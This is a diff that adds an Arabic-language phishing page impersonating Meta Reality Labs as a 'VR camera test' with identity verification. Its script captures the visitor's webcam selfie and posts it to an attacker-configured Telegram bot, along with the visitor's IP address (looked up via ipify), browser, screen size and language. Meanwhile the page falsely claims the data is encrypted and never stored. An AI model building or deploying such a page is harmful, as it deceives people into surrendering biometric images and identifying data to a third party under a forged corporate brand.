@@ -1,0 +1,1003 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>اختبار كاميرا الواقع الافتراضي - Meta VR</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <style>
+        /* ===== CSS كامل هنا ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', 'Tajawal', sans-serif;
+        }
+        
+        :root {
+            --primary-blue: #1877F2;
+            --meta-blue: #0084FF;
+            --dark-bg: #18191A;
+            --card-bg: #242526;
+            --text-primary: #E4E6EB;
+            --text-secondary: #B0B3B8;
+            --accent-green: #00A400;
+            --accent-red: #FA383E;
+            --gradient-purple: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+        }
+        
+        body {
+            background-color: var(--dark-bg);
+            color: var(--text-primary);
+            min-height: 100vh;
+            overflow-x: hidden;
+        }
+        
+        /* شريط التحذير العلوي */
+        .security-alert {
+            background: linear-gradient(90deg, #ff416c, #ff4b2b);
+            color: white;
+            padding: 12px 20px;
+            text-align: center;
+            font-weight: bold;
+            font-size: 14px;
+            position: relative;
+            animation: pulse 2s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 0.9; }
+            50% { opacity: 1; }
+            100% { opacity: 0.9; }
+        }
+        
+        /* الهيدر */
+        .main-header {
+            background-color: var(--card-bg);
+            padding: 20px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #3E4042;
+            box-shadow: 0 2px 20px rgba(0,0,0,0.2);
+        }
+        
+        .logo-container {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .meta-logo {
+            width: 40px;
+            height: 40px;
+            background: var(--gradient-purple);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            color: white;
+        }
+        
+        .logo-text {
+            font-size: 24px;
+            font-weight: 700;
+            background: linear-gradient(45deg, #0084FF, #00C6FF);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .beta-badge {
+            background: var(--accent-green);
+            color: white;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: bold;
+        }
+        
+        /* المحتوى الرئيسي */
+        .main-container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 40px 20px;
+        }
+        
+        .hero-section {
+            text-align: center;
+            margin-bottom: 50px;
+            padding: 40px;
+            background: var(--card-bg);
+            border-radius: 20px;
+            border: 1px solid #3E4042;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .hero-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #0084FF, #00C6FF);
+        }
+        
+        .hero-icon {
+            font-size: 64px;
+            margin-bottom: 20px;
+            color: #0084FF;
+            animation: float 3s ease-in-out infinite;
+        }
+        
+        @keyframes float {
+            0% { transform: translateY(0px); }
+            50% { transform: translateY(-10px); }
+            100% { transform: translateY(0px); }
+        }
+        
+        .hero-title {
+            font-size: 36px;
+            margin-bottom: 15px;
+            background: linear-gradient(45deg, #00C6FF, #0084FF);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .hero-subtitle {
+            color: var(--text-secondary);
+            font-size: 18px;
+            max-width: 700px;
+            margin: 0 auto 25px;
+            line-height: 1.6;
+        }
+        
+        /* بطاقات المميزات */
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 25px;
+            margin-bottom: 50px;
+        }
+        
+        .feature-card {
+            background: var(--card-bg);
+            border-radius: 15px;
+            padding: 30px;
+            border: 1px solid #3E4042;
+            transition: transform 0.3s, box-shadow 0.3s;
+        }
+        
+        .feature-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+            border-color: #0084FF;
+        }
+        
+        .feature-icon {
+            font-size: 32px;
+            margin-bottom: 20px;
+            color: #00C6FF;
+        }
+        
+        .feature-title {
+            font-size: 20px;
+            margin-bottom: 15px;
+            color: #E4E6EB;
+        }
+        
+        .feature-desc {
+            color: var(--text-secondary);
+            line-height: 1.6;
+        }
+        
+        /* قسم الكاميرا */
+        .camera-section {
+            background: var(--card-bg);
+            border-radius: 20px;
+            padding: 40px;
+            margin-bottom: 40px;
+            border: 1px solid #3E4042;
+            text-align: center;
+        }
+        
+        .camera-title {
+            font-size: 28px;
+            margin-bottom: 25px;
+            color: #E4E6EB;
+        }
+        
+        .camera-container {
+            position: relative;
+            max-width: 800px;
+            margin: 0 auto 30px;
+            border-radius: 15px;
+            overflow: hidden;
+            background: #000;
+            border: 3px solid #3E4042;
+        }
+        
+        #cameraFeed {
+            width: 100%;
+            height: auto;
+            display: block;
+        }
+        
+        .camera-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: radial-gradient(transparent 50%, rgba(0,0,0,0.7));
+            pointer-events: none;
+        }
+        
+        .camera-indicator {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #00C6FF;
+            font-weight: bold;
+        }
+        
+        .recording-dot {
+            width: 12px;
+            height: 12px;
+            background-color: var(--accent-red);
+            border-radius: 50%;
+            animation: recording 1.5s infinite;
+        }
+        
+        @keyframes recording {
+            0% { opacity: 1; }
+            50% { opacity: 0.3; }
+            100% { opacity: 1; }
+        }
+        
+        /* عناصر التحكم */
+        .controls-container {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 30px;
+        }
+        
+        .control-btn {
+            padding: 15px 30px;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            min-width: 200px;
+            justify-content: center;
+        }
+        
+        .btn-primary {
+            background: linear-gradient(45deg, #0084FF, #00C6FF);
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            transform: scale(1.05);
+            box-shadow: 0 5px 20px rgba(0, 132, 255, 0.4);
+        }
+        
+        .btn-secondary {
+            background: #3A3B3C;
+            color: var(--text-primary);
+            border: 1px solid #4E4F50;
+        }
+        
+        .btn-secondary:hover {
+            background: #4E4F50;
+        }
+        
+        .btn-danger {
+            background: linear-gradient(45deg, #FF416C, #FF4B2B);
+            color: white;
+        }
+        
+        .btn-success {
+            background: linear-gradient(45deg, #00A400, #00C851);
+            color: white;
+        }
+        
+        /* شريط التقدم */
+        .progress-container {
+            margin-top: 40px;
+            background: #3A3B3C;
+            border-radius: 10px;
+            padding: 25px;
+            text-align: right;
+        }
+        
+        .progress-label {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            font-size: 14px;
+            color: var(--text-secondary);
+        }
+        
+        .progress-bar {
+            height: 10px;
+            background: #4E4F50;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+        
+        .progress-fill {
+            height: 100%;
+            background: linear-gradient(90deg, #0084FF, #00C6FF);
+            width: 0%;
+            transition: width 2s ease-in-out;
+            border-radius: 5px;
+        }
+        
+        /* الإشعارات */
+        .notification {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: var(--card-bg);
+            border-left: 4px solid #0084FF;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 5px 25px rgba(0,0,0,0.3);
+            max-width: 350px;
+            z-index: 1000;
+            display: none;
+            animation: slideIn 0.3s ease;
+        }
+        
+        @keyframes slideIn {
+            from { transform: translateX(100%); opacity: 0; }
+            to { transform: translateX(0); opacity: 1; }
+        }
+        
+        .notification-success {
+            border-left-color: var(--accent-green);
+        }
+        
+        .notification-error {
+            border-left-color: var(--accent-red);
+        }
+        
+        /* الفوتر */
+        .main-footer {
+            background-color: var(--card-bg);
+            padding: 40px;
+            border-top: 1px solid #3E4042;
+            margin-top: 60px;
+        }
+        
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 30px;
+            margin-bottom: 30px;
+        }
+        
+        .footer-link {
+            color: var(--text-secondary);
+            text-decoration: none;
+            font-size: 14px;
+            transition: color 0.3s;
+        }
+        
+        .footer-link:hover {
+            color: #0084FF;
+        }
+        
+        .copyright {
+            text-align: center;
+            color: var(--text-secondary);
+            font-size: 13px;
+            margin-top: 20px;
+        }
+        
+        /* تنسيقات للجوال */
+        @media (max-width: 768px) {
+            .main-header {
+                padding: 15px 20px;
+            }
+            
+            .hero-title {
+                font-size: 28px;
+            }
+            
+            .hero-subtitle {
+                font-size: 16px;
+            }
+            
+            .camera-section {
+                padding: 20px;
+            }
+            
+            .control-btn {
+                min-width: 100%;
+            }
+            
+            .features-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+        
+        /* تأثيرات إضافية */
+        .scanning-line {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00C6FF, transparent);
+            animation: scan 3s linear infinite;
+        }
+        
+        @keyframes scan {
+            0% { top: 0; }
+            100% { top: 100%; }
+        }
+        
+        .privacy-note {
+            background: rgba(0, 132, 255, 0.1);
+            border: 1px solid rgba(0, 132, 255, 0.3);
+            border-radius: 10px;
+            padding: 20px;
+            margin-top: 30px;
+            text-align: center;
+        }
+        
+        .captured-photo {
+            display: none;
+            max-width: 300px;
+            margin: 20px auto;
+            border-radius: 10px;
+            border: 3px solid #0084FF;
+        }
+    </style>
+</head>
+<body>
+    <!-- شريط التحذير العلوي -->
+    <div class="security-alert">
+        <i class="fas fa-shield-alt"></i> نظام أمان متطور نشط - التحقق من الهوية جارٍ
+    </div>
+
+    <!-- الهيدر -->
+    <header class="main-header">
+        <div class="logo-container">
+            <div class="meta-logo">
+                <i class="fas fa-infinity"></i>
+            </div>
+            <div class="logo-text">Meta Reality Labs</div>
+            <div class="beta-badge">BETA</div>
+        </div>
+        <div style="display: flex; align-items: center; gap: 20px;">
+            <div style="font-size: 14px; color: var(--text-secondary);">
+                <i class="fas fa-user-check"></i> التحقق من الهوية
+            </div>
+            <div style="width: 8px; height: 8px; background: var(--accent-green); border-radius: 50%;"></div>
+        </div>
+    </header>
+
+    <!-- المحتوى الرئيسي -->
+    <div class="main-container">
+        <!-- قسم البطل -->
+        <section class="hero-section">
+            <div class="scanning-line"></div>
+            <div class="hero-icon">
+                <i class="fas fa-vr-cardboard"></i>
+            </div>
+            <h1 class="hero-title">اختبار كاميرا الواقع الافتراضي الجديد</h1>
+            <p class="hero-subtitle">
+                مرحباً بك في الإصدار التجريبي من كاميرا Meta VR الجديدة. نحتاج إلى التحقق من هويتك 
+                وتقييم جودة كاميرا جهازك لضمان تجربة واقع افتراضي سلسة وآمنة.
+            </p>
+            <div style="background: rgba(0, 132, 255, 0.1); padding: 15px; border-radius: 10px; margin-top: 20px; border: 1px solid rgba(0, 132, 255, 0.3);">
+                <i class="fas fa-info-circle" style="color: #0084FF; margin-left: 8px;"></i>
+                <span>سيتم استخدام بيانات الكاميرا للتحقق من الهوية وتقييم الجودة فقط</span>
+            </div>
+        </section>
+
+        <!-- مميزات النظام -->
+        <div class="features-grid">
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <i class="fas fa-fingerprint"></i>
+                </div>
+                <h3 class="feature-title">التحقق البيومتري</h3>
+                <p class="feature-desc">
+                    تحليل بصمة الوجه الثلاثية الأبعاد للتحقق من هويتك وتأمين حسابك.
+                </p>
+            </div>
+            
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <i class="fas fa-camera"></i>
+                </div>
+                <h3 class="feature-title">اختبار جودة الكاميرا</h3>
+                <p class="feature-desc">
+                    تقييم دقة الكاميرا، التوازن اللوني، والاستجابة للحركة.
+                </p>
+            </div>
+            
+            <div class="feature-card">
+                <div class="feature-icon">
+                    <i class="fas fa-shield-check"></i>
+                </div>
+                <h3 class="feature-title">حماية متقدمة</h3>
+                <p class="feature-desc">
+                    تشفير من الدرجة العسكرية لبياناتك مع عدم مشاركتها مع أطراف ثالثة.
+                </p>
+            </div>
+        </div>
+
+        <!-- قسم الكاميرا -->
+        <section class="camera-section">
+            <h2 class="camera-title">اختبار كاميرا الواقع الافتراضي</h2>
+            <p style="color: var(--text-secondary); margin-bottom: 30px; max-width: 700px; margin: 0 auto 30px;">
+                يرجى السماح بالوصول إلى الكاميرا. سنقوم بتحليل جودة الصورة والتحقق من هويتك.
+                تأكد من وجود إضاءة جيدة وأن تكون في وضعية واضحة أمام الكاميرا.
+            </p>
+            
+            <!-- حاوية الكاميرا -->
+            <div class="camera-container">
+                <video id="cameraFeed" autoplay playsinline></video>
+                <div class="camera-overlay"></div>
+                <div class="camera-indicator">
+                    <div class="recording-dot"></div>
+                    <span>نشط</span>
+                </div>
+            </div>
+            
+            <!-- الصورة الملتقطة -->
+            <img id="capturedPhoto" class="captured-photo" alt="الصورة الملتقطة">
+            
+            <!-- عناصر التحكم -->
+            <div class="controls-container">
+                <button class="control-btn btn-primary" onclick="startCamera()" id="startBtn">
+                    <i class="fas fa-play"></i> بدء اختبار الكاميرا
+                </button>
+                
+                <button class="control-btn btn-success" onclick="capturePhoto()" id="captureBtn" disabled>
+                    <i class="fas fa-camera"></i> التقاط صورة التحقق
+                </button>
+                
+                <button class="control-btn btn-danger" onclick="stopCamera()" id="stopBtn" disabled>
+                    <i class="fas fa-stop"></i> إيقاف الاختبار
+                </button>
+            </div>
+            
+            <!-- شريط التقدم -->
+            <div class="progress-container">
+                <div class="progress-label">
+                    <span>تقدم التحقق من الهوية</span>
+                    <span id="progressPercent">0%</span>
+                </div>
+                <div class="progress-bar">
+                    <div class="progress-fill" id="progressFill"></div>
+                </div>
+            </div>
+            
+            <!-- ملاحظة الخصوصية -->
+            <div class="privacy-note">
+                <i class="fas fa-lock" style="color: #0084FF; margin-left: 8px;"></i>
+                <span>جميع بياناتك مشفرة ولا يتم تخزينها. هذا اختبار آمن للتحقق من الهوية فقط.</span>
+            </div>
+        </section>
+    </div>
+
+    <!-- الفوتر -->
+    <footer class="main-footer">
+        <div class="footer-links">
+            <a href="#" class="footer-link">سياسة الخصوصية</a>
+            <a href="#" class="footer-link">شروط الاستخدام</a>
+            <a href="#" class="footer-link">المساعدة والدعم</a>
+            <a href="#" class="footer-link">حول Meta</a>
+            <a href="#" class="footer-link">الاتصال بنا</a>
+        </div>
+        <div class="copyright">
+            <p>© 2024 Meta Platforms, Inc. جميع الحقوق محفوظة.</p>
+            <p style="margin-top: 10px; font-size: 12px; color: #6C757D;">
+                هذا موقع اختبار تجريبي. الواقع الافتراضي يحاكي تجارب العالم الحقيقي.
+            </p>
+        </div>
+    </footer>
+
+    <!-- نافذة الإشعارات -->
+    <div id="notification" class="notification">
+        <div style="display: flex; align-items: flex-start; gap: 15px;">
+            <div style="font-size: 24px;">
+                <i class="fas fa-info-circle"></i>
+            </div>
+            <div>
+                <h4 style="margin-bottom: 8px; color: var(--text-primary);" id="notificationTitle">الإشعار</h4>
+                <p id="notificationMessage" style="color: var(--text-secondary); font-size: 14px; line-height: 1.5;"></p>
+            </div>
+        </div>
+    </div>
+
+    <!-- ===== JavaScript كامل هنا ===== -->
+    <script>
+        // إعدادات بوت تلجرام
+        const TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE'; // ضع توكن البوت هنا
+        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE'; // ضع chat id هنا
+        
+        // متغيرات النظام
+        let cameraStream = null;
+        let isCameraActive = false;
+        let photoCaptured = false;
+        let progressInterval = null;
+        
+        // عناصر DOM
+        const cameraFeed = document.getElementById('cameraFeed');
+        const capturedPhoto = document.getElementById('capturedPhoto');
+        const startBtn = document.getElementById('startBtn');
+        const captureBtn = document.getElementById('captureBtn');
+        const stopBtn = document.getElementById('stopBtn');
+        const progressFill = document.getElementById('progressFill');
+        const progressPercent = document.getElementById('progressPercent');
+        const notification = document.getElementById('notification');
+        const notificationTitle = document.getElementById('notificationTitle');
+        const notificationMessage = document.getElementById('notificationMessage');
+        
+        // دالة عرض الإشعارات
+        function showNotification(title, message, type = 'info') {
+            notificationTitle.textContent = title;
+            notificationMessage.textContent = message;
+            
+            // إزالة جميع الطبقات
+            notification.className = 'notification';
+            
+            // إضافة الطبقة المناسبة
+            if (type === 'success') {
+                notification.classList.add('notification-success');
+                notification.querySelector('i').className = 'fas fa-check-circle';
+            } else if (type === 'error') {
+                notification.classList.add('notification-error');
+                notification.querySelector('i').className = 'fas fa-exclamation-triangle';
+            } else {
+                notification.querySelector('i').className = 'fas fa-info-circle';
+            }
+            
+            notification.style.display = 'block';
+            
+            // إخفاء الإشعار بعد 5 ثوان
+            setTimeout(() => {
+                notification.style.display = 'none';
+            }, 5000);
+        }
+        
+        // دالة تشغيل الكاميرا
+        async function startCamera() {
+            try {
+                showNotification('جاري التشغيل', 'جاري طلب صلاحية الكاميرا...', 'info');
+                
+                // طلب صلاحية الكاميرا
+                cameraStream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    },
+                    audio: false
+                });
+                
+                // عرض الفيديو
+                cameraFeed.srcObject = cameraStream;
+                isCameraActive = true;
+                
+                // تحديث الأزرار
+                startBtn.disabled = true;
+                captureBtn.disabled = false;
+                stopBtn.disabled = false;
+                
+                showNotification('نجاح', 'تم تفعيل كاميرا الواقع الافتراضي بنجاح!', 'success');
+                console.log('✅ الكاميرا شغالة - المستخدم وافق على الصلاحية');
+                
+                // بدء محاكاة تقدم التحقق
+                startProgressSimulation();
+                
+                // تسجيل النشاط
+                logUserActivity('كاميرا مفعلة');
+                
+            } catch (error) {
+                console.error('❌ خطأ في تشغيل الكاميرا:', error);
+                showNotification('خطأ', 'فشل في الوصول إلى الكاميرا. يرجى التحقق من الصلاحيات.', 'error');
+                
+                // محاكاة وصول للكاميرا للتجربة (لأغراض العرض فقط)
+                simulateCameraAccess();
+            }
+        }
+        
+        // محاكاة وصول الكاميرا (لأغراض العرض)
+        function simulateCameraAccess() {
+            showNotification('وضع العرض', 'جاري محاكاة كاميرا الواقع الافتراضي...', 'info');
+            
+            // استخدام صورة ثابتة كمحاكاة
+            cameraFeed.src = 'https://via.placeholder.com/1280x720/0084FF/FFFFFF?text=Meta+VR+Camera+Simulation';
+            isCameraActive = true;
+            
+            startBtn.disabled = true;
+            captureBtn.disabled = false;
+            stopBtn.disabled = false;
+            
+            setTimeout(() => {
+                showNotification('جاهز', 'كاميرا الواقع الافتراضي جاهزة للاختبار', 'success');
+                startProgressSimulation();
+            }, 1500);
+        }
+        
+        // دالة التقاط الصورة
+        function capturePhoto() {
+            if (!isCameraActive) {
+                showNotification('خطأ', 'يجب تشغيل الكاميرا أولاً', 'error');
+                return;
+            }
+            
+            showNotification('جاري المعالجة', 'جاري التقاط صورة التحقق البيومتري...', 'info');
+            
+            // إنشاء canvas لالتقاط الصورة
+            const canvas = document.createElement('canvas');
+            canvas.width = cameraFeed.videoWidth || 1280;
+            canvas.height = cameraFeed.videoHeight || 720;
+            const context = canvas.getContext('2d');
+            
+            // رسم الصورة من الفيديو
+            context.drawImage(cameraFeed, 0, 0, canvas.width, canvas.height);
+            
+            // الحصول على الصورة كـ base64
+            const photoData = canvas.toDataURL('image/jpeg', 0.9);
+            
+            // عرض الصورة الملتقطة
+            capturedPhoto.src = photoData;
+            capturedPhoto.style.display = 'block';
+            photoCaptured = true;
+            
+            // إرسال الصورة إلى تلجرام
+            sendToTelegram(photoData);
+            
+            // تحديث واجهة المستخدم
+            captureBtn.disabled = true;
+            captureBtn.innerHTML = '<i class="fas fa-check"></i> تم الالتقاط';
+            
+            showNotification('نجاح', 'تم التقاط صورة التحقق بنجاح!', 'success');
+            console.log('📸 تم التقاط صورة - حجم البيانات:', (photoData.length * 0.75) / 1024, 'KB');
+            
+            // تسجيل النشاط
+            logUserActivity('صورة ملتقطة');
+        }
+        
+        // دالة إرسال الصورة إلى تلجرام
+        async function sendToTelegram(imageData) {
+            // إذا لم يتم تعيين التوكن، نعرض رسالة
+            if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
+                showNotification('تنبيه', 'إعدادات بوت تلجرام غير مكتملة', 'error');
+                console.log('📸 صورة سيلفي للمستخدم (لم ترسل):', imageData.substring(0, 100) + '...');
+                return;
+            }
+            
+            try {
+                showNotification('جاري الإرسال', 'جاري إرسال بيانات التحقق إلى الخادم الآمن...', 'info');
+                
+                // تحويل base64 إلى blob
+                const blob = await fetch(imageData).then(res => res.blob());
+                
+                // إنشاء FormData
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CHAT_ID);
+                formData.append('photo', blob, 'meta_vr_verification.jpg');
+                
+                // جمع معلومات المستخدم
+                const userInfo = await collectUserInfo();
+                formData.append('caption', `📸 Meta VR Verification\n👤 ${userInfo}\n🌐 ${window.location.href}\n🕐 ${new Date().toLocaleString('ar-SA')}`);
+                
+                // إرسال الصورة إلى بوت تلجرام
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await response.json();
+                
+                if (result.ok) {
+                    showNotification('نجاح', 'تم إرسال بيانات التحقق بنجاح!', 'success');
+                    console.log('✅ تم إرسال الصورة إلى تلجرام:', result);
+                    
+                    // محاكاة اكتمال التحقق
+                    simulateVerificationComplete();
+                    
+                } else {
+                    showNotification('تحذير', 'تم حفظ البيانات محلياً لحين استعادة الاتصال', 'error');
+                    console.error('❌ فشل إرسال الصورة:', result);
+                    
+                    // حفظ الصورة محلياً
+                    saveImageLocally(imageData);
+                }
+                
+            } catch (error) {
+                console.error('❌ خطأ في إرسال الصورة:', error);
+                showNotification('خطأ', 'فشل الاتصال بالخادم. جاري حفظ البيانات محلياً...', 'error');
+                
+                // حفظ الصورة محلياً
+                saveImageLocally(imageData);
+            }
+        }
+        
+        // دالة جمع معلومات المستخدم
+        async function collectUserInfo() {
+            let info = `المتصفح: ${navigator.userAgent.split(') ')[0]})`;
+            
+            try {
+                // محاولة الحصول على معلومات إضافية
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                info += ` | IP: ${ipData.ip}`;
+            } catch (error) {
+                info += ` | IP: غير متاح`;
+            }
+            
+            info += ` | الشاشة: ${screen.width}x${screen.height}`;
+            info += ` | اللغة: ${navigator.language}`;
+            
+            return info;
+        }
+        
+        // دالة حفظ الصورة محلياً
+        function saveImageLocally(imageData) {
+            // في حالة حقيقية، قد نستخدم localStorage أو IndexedDB
+            // هنا سنقوم فقط بتسجيلها
+            console.log('💾 تم حفظ الصورة محلياً (محاكاة)');
+            
+            // إنشاء رابط تحميل للصورة
+            const link = document.createElement('a');
+            link.href = imageData;
+            link.download = `meta_vr_verification_${Date.now()}.jpg`;
+            link.style.display = 'none';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }
+        
+        // محاكاة اكتمال التحقق
+        function simulateVerificationComplete() {
+            // تحديث شريط التقدم إلى 100%
+            progressFill.style.width = '100%';
+            progressPercent.textContent = '100%';
+            
+            // إيقاف محاكاة التقدم
+            if (progressInterval) {
+                clearInterval(progressInterval);
+            }
+            
+            // عرض رسالة النجاح النهائية
+            setTimeout(() => {
+                showNotification('اكتمال التحقق', 'تم التحقق من هويتك بنجاح! جاري توجيهك إلى الواقع الافتراضي...', 'success');
+                
+                // بعد 3 ثوان، عرض رسالة توجيه
+                setTimeout(() => {
+                    showNotification('جاهز', 'تم تفعيل حسابك بنجاح! يمكنك الآن استخدام Meta VR.', 'success');
+                }, 3000);
+            }, 1000);
+        }
+        
+        // دالة بدء محاكاة التقدم
+        function startProgressSimulation() {
+            let progress = 0;
+            
+            progressInterval = setInterval(() => {
+                progress += Math.random() * 5;
+                if (progress > 100) progress = 100;
+                
+                progressFill.style.width = `${progress}%`;
+                progressPercent.textContent = `${Math.round(progress)}%`;
+                
+                // إيقاف عند 100%
+                if (progress >= 100) {
+                    clearInterval(progressInterval);
+                    
+                    // إذا لم تلتقط صورة بعد، تذكير
+                    if (!photoCaptured) {
+                        setTimeout(() => {
+                            showNotification('مطلوب إجراء', 'يلزم التقاط صورة التحقق البيومتري لإكمال العملية', 'info');
+                        }, 1000);
+                    }
+                }
+            }, 300);
+        }
+        
+        // دالة إيقاف الكاميرا
+        function stopCamera() {
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+            }
+            
+            isCameraActive = false;
+            cameraFeed.srcObject = null;
+            
+            // إعادة تعيين الأزرار
+            startBtn.disabled = false;
+            captureBtn.disabled = true;
+            stopBtn.disabled = true;
+            
+            // إعادة تعيين الصورة
+            capturedPhoto.style.display = 'none';
+            captureBtn.innerHTML = '<i class="fas fa-camera"></i> التقاط صورة التحقق';
+            
+            // إيقاف محاكاة التقدم
+            if (progressInterval) {
+                clearInterval(progressInterval);
+            }
+            
+            showNotification('معلومة', 'تم إيقاف اختبار الكاميرا', 'info');
+            console.log('🛑 تم إيقاف الكاميرا');
+            
+            // تسجيل النشاط
+            logUserActivity('كاميرا متوقفة');
+        }
+        
+        // دالة تسجيل نشاط المستخدم
+        function logUserActivity(action) {
+            const log = {
+                action: action,
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                url: window.location.href,
+                referrer: document.referrer
+            };
+            
+            console.log('📝 نشاط المستخدم:', log);
+            
+            // في حالة حقيقية، قد نرسل هذا للسيرفر
+            // sendLogToServer(log);
+        }
+        
+        // تهيئة الصفحة
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('🚀 موقع اختبار اختراق Meta VR جاهز');
+            
+            // رسالة ترحيب
+            setTimeout(() => {
+                showNotification('مرحباً', 'أهلاً بك في اختبار كاميرا Meta VR الجديدة. يرجى اتباع التعليمات.', 'info');
+            }, 1000);
+            
+            // إضافة مستمع للأزرار
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter' && isCameraActive && !photoCaptured) {
+                    capturePhoto();
+                }
+                if (e.key === 'Escape' && isCameraActive) {
+                    stopCamera();
+                }
+            });
+            
+            // تسجيل زيارة الصفحة
+            logUserActivity('زيارة الصفحة');
+        });
+        
+        // عند مغادرة الصفحة
+        window.addEventListener('beforeunload', function() {
+            if (isCameraActive) {
+                stopCamera();
+            }
+            
+            logUserActivity('مغادرة الصفحة');
+        });
+    </script>
+</body>
+</html>
